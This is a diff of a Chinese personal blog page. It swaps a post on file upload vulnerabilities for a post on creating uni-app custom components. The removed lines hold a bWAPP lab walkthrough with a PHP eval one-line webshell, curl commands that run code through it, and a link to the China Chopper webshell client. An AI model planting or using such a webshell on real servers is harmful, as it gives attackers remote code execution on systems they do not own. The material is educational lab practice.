@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="文件上传漏洞[一], 黑客帮,HackBG,hackbg,肥胖喵博客,肥胖喵,微信公众号">
+    <meta name="keywords" content="黑客帮,HackBG,hackbg,肥胖喵博客,肥胖喵,微信公众号">
     <meta name="description" content="分享知识，记录学习心得的个人博客">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>文件上传漏洞[一] | HackBG</title>
+    <title>HackBG</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -239,12 +239,12 @@ color="122 103 238" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/images/web%E5%AE%89%E5%85%A8/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">文件上传漏洞[一]</h1>
+                    <h1 class="description center-align post-title"></h1>
                 </div>
             </div>
         </div>
@@ -359,25 +359,12 @@ color="122 103 238" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/Web%E5%AE%89%E5%85%A8/">
-                                <span class="chip bg-color">Web安全</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="post-category">
-                                文件上传漏洞
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -386,21 +373,21 @@ color="122 103 238" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-03-15
+                    2021-04-10
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-03-15
+                    2021-04-10
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    380
+                    1
                 </div>
                 
 
@@ -422,33 +409,21 @@ color="122 103 238" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="一、文件上传漏洞概述"><a href="#一、文件上传漏洞概述" class="headerlink" title="一、文件上传漏洞概述"></a>一、文件上传漏洞概述</h2><p>  文件上传（File Upload）是大部分Web应用都具备的功能，例如用户上传附件、改头像、分享图片等。</p>
-<p>文件上传漏洞是在开发者没有做充足验证（包括前端，后端）情况下，允许用户上传恶意文件，这里上传的文件可以是木马、病毒、恶意脚本或者Webshell等。</p>
-<hr>
-<h2 id="二、编辑木马文件并上传"><a href="#二、编辑木马文件并上传" class="headerlink" title="二、编辑木马文件并上传"></a>二、编辑木马文件并上传</h2><h3 id="1-eval函数"><a href="#1-eval函数" class="headerlink" title="1.eval函数"></a>1.eval函数</h3><p>eval( string $code)</p>
-<p>把字符串 code 作为PHP代码执行。函数eval()语言结构允许执行任意 PHP 代码。code为 需要被执行的字符串 。</p>
-<p>代码执行的作用域是调用 eval() 处的作用域。因此，eval() 里任何的变量定义、修改，都会在函数结束后被保留。</p>
-<hr>
-<h3 id="2-PHP一句话木马"><a href="#2-PHP一句话木马" class="headerlink" title="2.PHP一句话木马"></a>2.PHP一句话木马</h3><pre><code>&lt;?php @eval($_POST[&#39;hacker&#39;]); ?&gt;</code></pre>
-<p>新建文本文件写入PHP一句话木马，并将txt后缀改为php.</p>
-<p><img src="https://img-blog.csdnimg.cn/20210314115226333.png"></p>
-<hr>
-<h3 id="3-上传PHP文件"><a href="#3-上传PHP文件" class="headerlink" title="3.上传PHP文件"></a>3.上传PHP文件</h3><p>登录bwapp靶场后选择Unrestricted File Upload,文件上传漏洞上传文件，上传后可以看到路径为   靶场路径+/images/shell.php</p>
-<p><img src="https://img-blog.csdnimg.cn/20210314115551830.png"><br><img src="https://img-blog.csdnimg.cn/20210314115616674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70"></p>
-<hr>
-<h3 id="4-webshell执行命令"><a href="#4-webshell执行命令" class="headerlink" title="4.webshell执行命令"></a>4.webshell执行命令</h3><p>在cmd执行</p>
-<pre><code>curl -d &quot;hacker=echo get_current_user();&quot; 靶场路径/images/shell.php
-curl -d &quot;hacker=echo getcwd();&quot; 靶场路径/images/shell.php</code></pre>
-<p>get_current_user — 获取当前 PHP 脚本所有者名称</p>
-<p>getcwd — 取得当前工作目录。<br><img src="https://img-blog.csdnimg.cn/20210314115808496.png"></p>
-<hr>
-<h3 id="5-使用中国菜刀连接"><a href="#5-使用中国菜刀连接" class="headerlink" title="5.使用中国菜刀连接"></a>5.使用中国菜刀连接</h3><p>下载链接：<a target="_blank" rel="noopener" href="https://github.com/raddyfiy/caidao-official-version">https://github.com/raddyfiy/caidao-official-version</a></p>
-<p>打开软件后，右键添加SHELL连接即可。</p>
-<p><img src="https://img-blog.csdnimg.cn/20210314120042500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210314120010248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70"></p>
-<hr>
-<h3 id="6-不同语言一句话木马"><a href="#6-不同语言一句话木马" class="headerlink" title="6.不同语言一句话木马"></a>6.不同语言一句话木马</h3><p><img src="https://img-blog.csdnimg.cn/20210314120109482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70"></p>
-<hr>
+                <p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
+<hr style=" border:solid; width:100px; height:1px;" color="#000000" size="1"">
+
+
+
+
+
+
+
+<h1 id="一、步骤"><a href="#一、步骤" class="headerlink" title="一、步骤"></a>一、步骤</h1><h2 id="1-新建文件夹"><a href="#1-新建文件夹" class="headerlink" title="1.新建文件夹"></a>1.新建文件夹</h2><p>在项目中右键新建名为 <b> components </b> 的文件夹<br><img src="https://img-blog.csdnimg.cn/20210410211321743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="2-新建Vue文件并封装"><a href="#2-新建Vue文件并封装" class="headerlink" title="2.新建Vue文件并封装"></a>2.新建Vue文件并封装</h2><p>文件名即可为自定义组件名（zdy.vue），<br><img src="https://img-blog.csdnimg.cn/20210410211425644.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="3-自定义组件使用"><a href="#3-自定义组件使用" class="headerlink" title="3.自定义组件使用"></a>3.自定义组件使用</h2><p><img src="https://img-blog.csdnimg.cn/2021041021222144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210410212437520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<hr style=" border:solid; width:100px; height:1px;" color="#000000" size="1"">
+
+
 
             </div>
             <hr/>
@@ -474,7 +449,7 @@ curl -d &quot;hacker=echo getcwd();&quot; 靶场路径/images/shell.php</code></
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://hackbg.gitee.io/2021/03/15/web-an-quan-yi-wen-jian-shang-chuan-lou-dong-yi/">https://hackbg.gitee.io/2021/03/15/web-an-quan-yi-wen-jian-shang-chuan-lou-dong-yi/</a>
+                    <a href="https://hackbg.gitee.io/2021/04/10/guan-yu-uniapp-zhong-zi-ding-yi-zu-jian-de-feng-zhuang-ji-shi-yong/">https://hackbg.gitee.io/2021/04/10/guan-yu-uniapp-zhong-zi-ding-yi-zu-jian-de-feng-zhuang-ji-shi-yong/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -511,11 +486,7 @@ curl -d &quot;hacker=echo getcwd();&quot; 靶场路径/images/shell.php</code></
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/Web%E5%AE%89%E5%85%A8/">
-                                    <span class="chip bg-color">Web安全</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -678,9 +649,10 @@ curl -d &quot;hacker=echo getcwd();&quot; 靶场路径/images/shell.php</code></
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/04/10/guan-yu-uniapp-zhong-zi-ding-yi-zu-jian-de-feng-zhuang-ji-shi-yong/">
                     <div class="card-image">
@@ -702,9 +674,9 @@ curl -d &quot;hacker=echo getcwd();&quot; 靶场路径/images/shell.php</code></
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-04-10
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-10
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -713,6 +685,7 @@ curl -d &quot;hacker=echo getcwd();&quot; 靶场路径/images/shell.php</code></
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -723,30 +696,30 @@ curl -d &quot;hacker=echo getcwd();&quot; 靶场路径/images/shell.php</code></
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/03/01/java-huan-jing-chong-zhuang/">
+                <a href="/2021/03/15/web-an-quan-yi-wen-jian-shang-chuan-lou-dong-yi/">
                     <div class="card-image">
                         
-                        <img src="/images/java%E9%87%8D%E8%A3%85/1.jpg" class="responsive-img" alt="关于java环境重装的问题">
+                        <img src="/images/web%E5%AE%89%E5%85%A8/1.jpg" class="responsive-img" alt="文件上传漏洞[一]">
                         
-                        <span class="card-title">关于java环境重装的问题</span>
+                        <span class="card-title">文件上传漏洞[一]</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            java环境重装踩坑随笔
+                            文件上传漏洞随笔
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-01
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-15
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/java/" class="post-category">
-                                    java
+                            <a href="/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="post-category">
+                                    文件上传漏洞
                                 </a>
                             
                             
@@ -756,8 +729,8 @@ curl -d &quot;hacker=echo getcwd();&quot; 靶场路径/images/shell.php</code></
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/java/">
-                        <span class="chip bg-color">java</span>
+                    <a href="/tags/Web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">Web安全</span>
                     </a>
                     
                 </div>
